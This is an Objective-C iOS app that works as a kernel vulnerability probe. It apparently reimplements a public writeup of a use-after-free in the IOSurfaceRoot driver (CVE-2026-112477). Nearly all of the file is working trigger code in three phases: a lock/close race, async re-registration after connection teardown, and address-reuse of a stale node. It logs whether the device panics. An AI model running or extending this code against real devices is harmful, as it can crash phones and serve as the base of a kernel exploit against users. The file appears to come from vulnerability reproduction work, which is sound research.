// israce-probe v2: CVE-2026-112477 on-device repro (iOS 27.0.1, 24A446)
// Reimplemented from the public writeup (Kimi-2011/ios27-iosurface-uaf).
// Three phases in one run: lockdeg race, postclose re-reg, addrreuse stale-node.
// Every step NSLogs (visible via device syslog) and is mirrored to Documents/israce.log.
#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#import <pthread.h>
#import <mach/mach_port.h>
#import <mach/mach_init.h>

typedef mach_port_t io_object_t, io_connect_t, io_iterator_t;
extern mach_port_t kIOMasterPortDefault;
kern_return_t IOServiceGetMatchingServices(mach_port_t, CFDictionaryRef, io_iterator_t *);
io_object_t IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);
CFMutableDictionaryRef IOServiceMatching(const char *);
kern_return_t IOServiceOpen(io_object_t, task_t, uint32_t, io_connect_t *);
kern_return_t IOServiceClose(io_connect_t);
kern_return_t IOObjectRelease(io_object_t);
kern_return_t IOConnectCallAsyncMethod(mach_port_t, uint32_t, mach_port_t, uint64_t *, uint32_t,
    const void *, size_t, const void *, size_t, void *, size_t *, void *, size_t *);

typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef);
extern kern_return_t IOSurfaceLock(IOSurfaceRef, uint32_t, uint32_t *);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef, uint32_t, uint32_t *);

#define SEL_REG 17
static FILE *gLog = NULL;
static void LOG(NSString *fmt, ...) {
    va_list a; va_start(a, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:a];
    va_end(a);
    NSLog(@"israce: %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

static IOSurfaceRef mkSurface(void) {
    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *k[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                         CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *v[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, k, v, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef s = IOSurfaceCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

static volatile int gRun = 0;
static void *spamLock(void *arg) {
    IOSurfaceRef s = (IOSurfaceRef)arg;
    uint32_t seed = 0;
    while (gRun) { IOSurfaceLock(s, 0, &seed); IOSurfaceUnlock(s, 0, &seed); }
    return NULL;
}

static int openConn(io_object_t svc, io_connect_t *out, mach_port_t *wpOut) {
    mach_port_t wp = MACH_PORT_NULL;
    if (IOServiceOpen(svc, mach_task_self(), 0, out) != KERN_SUCCESS) return -1;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp) != KERN_SUCCESS) {
        IOServiceClose(*out); return -2;
    }
    *wpOut = wp;
    return 0;
}
static void closeConn(io_connect_t c, mach_port_t wp) {
    IOServiceClose(c);
    if (wp) mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
}

static kern_return_t regAsync(io_connect_t c, mach_port_t wp) {
    uint64_t in[3] = { 1, 2, 3 };
    uint64_t ref = 0x1122334455667788ull;
    size_t soc = 0;
    return IOConnectCallAsyncMethod(c, SEL_REG, wp, &ref, 1, NULL, 0, in, 24, NULL, &soc, NULL, NULL);
}

// phase 1: lockdeg race (panic variant from the writeup)
static int phaseLockdeg(io_object_t svc) {
    pthread_t th[4];
    int opened = 0;
    for (int iter = 0; iter < 200; iter++) {
        io_connect_t c; mach_port_t wp;
        if (openConn(svc, &c, &wp) != 0) { if (iter == 0) LOG(@"p1 iter0 open failed"); continue; }
        kern_return_t r = regAsync(c, wp);
        IOSurfaceRef s = mkSurface();
        if (r == KERN_SUCCESS && s) {
            opened++;
            gRun = 1;
            for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamLock, s);
            usleep(200 + (iter % 40) * 25);
            IOServiceClose(c);
            usleep(300);
            gRun = 0;
            for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
            CFRelease(s);
        } else {
            if (s) CFRelease(s);
            closeConn(c, wp);
        }
        if (iter % 25 == 0) LOG(@"p1 iter %d rc=0x%x ok=%d", iter, (uint32_t)r, opened);
    }
    LOG(@"p1 done ok=%d", opened);
    return opened;
}

// phase 2: postclose - extra send right, re-register AFTER teardown (no race needed)
static int phasePostclose(io_object_t svc) {
    int ok = 0;
    for (int iter = 0; iter < 200; iter++) {
        io_connect_t c; mach_port_t wp;
        if (openConn(svc, &c, &wp) != 0) continue;
        mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
        uint32_t r1 = (uint32_t)regAsync(c, wp);   // attach
        uint32_t r2 = (uint32_t)regAsync(c, wp);   // duplicate -> 0xC9 expected
        IOServiceClose(c);                          // teardown: #802 unlinks
        uint32_t r3 = (uint32_t)regAsync(c, wp);   // re-reg after dereg
        uint32_t r4 = (uint32_t)regAsync(c, wp);
        mach_port_deallocate(mach_task_self(), c);
        mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
        if (r1 == 0) ok++;
        if (iter % 50 == 0) LOG(@"p2 iter %d rc 0x%x/0x%x/0x%x/0x%x", iter, r1, r2, r3, r4);
    }
    LOG(@"p2 done ok=%d", ok);
    return ok;
}

// phase 3: addrreuse - stale node from conn A, new conns recycle the address, close all
static int phaseAddrreuse(io_object_t svc) {
    int ok = 0;
    for (int iter = 0; iter < 100; iter++) {
        io_connect_t a; mach_port_t wp;
        if (openConn(svc, &a, &wp) != 0) continue;
        mach_port_mod_refs(mach_task_self(), a, MACH_PORT_RIGHT_SEND, +1);
        regAsync(a, wp);
        IOServiceClose(a);
        regAsync(a, wp);
        mach_port_deallocate(mach_task_self(), a);
        io_connect_t cs[24]; int have[24];
        int N = 24;
        for (int i = 0; i < N; i++) {
            have[i] = (openConn(svc, &cs[i], &(mach_port_t){0}) == 0);
            if (have[i]) { regAsync(cs[i], wp); ok++; }
            else cs[i] = 0;
        }
        for (int i = N - 1; i >= 0; i--) if (have[i]) IOServiceClose(cs[i]);
        mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
        if (iter % 25 == 0) LOG(@"p3 iter %d ok=%d", iter, ok);
    }
    LOG(@"p3 done ok=%d", ok);
    return ok;
}

static void *probeThread(void *arg) {
    (void)arg;
    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [dirs[0] stringByAppendingPathComponent:@"israce.log"];
    gLog = fopen(path.fileSystemRepresentation, "w");
    LOG(@"probe v2 start log=%@ errno=%d", path, errno);
    io_object_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    LOG(@"svc=0x%x", (uint32_t)svc);
    if (svc) {
        phaseLockdeg(svc);
        LOG(@"phase 2 starting");
        phasePostclose(svc);
        LOG(@"phase 3 starting");
        phaseAddrreuse(svc);
        IOObjectRelease(svc);
    }
    LOG(@"probe v2 END (no panic)");
    fclose(gLog); gLog = NULL;
    return NULL;
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)options {
    UIWindow *w = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    w.backgroundColor = [UIColor whiteColor];
    UILabel *l = [[UILabel alloc] initWithFrame:w.bounds];
    l.text = @"israce probe running\nblack screen = old build";
    l.numberOfLines = 0; l.textAlignment = NSTextAlignmentCenter; l.textColor = [UIColor blackColor];
    w.rootViewController = [[UIViewController alloc] init];
    w.rootViewController.view = l;
    [w makeKeyAndVisible];
    self.window = w;
    pthread_t t; pthread_create(&t, NULL, probeThread, NULL);
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
